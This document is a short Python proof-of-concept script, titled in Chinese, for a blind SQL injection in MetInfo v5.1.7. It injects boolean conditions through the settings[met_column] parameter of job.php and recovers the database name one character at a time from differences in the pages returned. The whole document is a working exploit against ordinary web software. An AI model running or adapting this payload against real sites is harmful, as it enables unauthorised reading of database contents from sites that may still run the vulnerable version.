#metinfo_v5.1.7的sql盲注PoC

#!/usr/bin/env python
# coding:utf-8
import re
import random
import time
import string
import sys
import requests



def verify():
    print 'start to retrive DBname:'
    chars = list('abcdefghijklmnopqrstuvwxyz0123456789@_.QWERTYUIOPASDFGHJKLZXCVBNM')
    url = "http://localhost/MetInfo_v5.1.7(1)/job/job.php?lang=cn&id=1&settings[met_column]=met_admin_table where"
    user = ''
    for i in range(10):
        for char in chars:
            payload = "ascii(mid(database(),%s,1))=%s-- 1" % (i,ord(char))
            html_doc = requests.get('%s %s' % (url,payload))
            print '.',
            if re.search('<div class="flash">',html_doc.text,re.M):
                user += char
                print '\n[please wait] %s' % user,
                break
    print '\n[Done]MySQL DBname is', user


if __name__ == '__main__':
    verify()
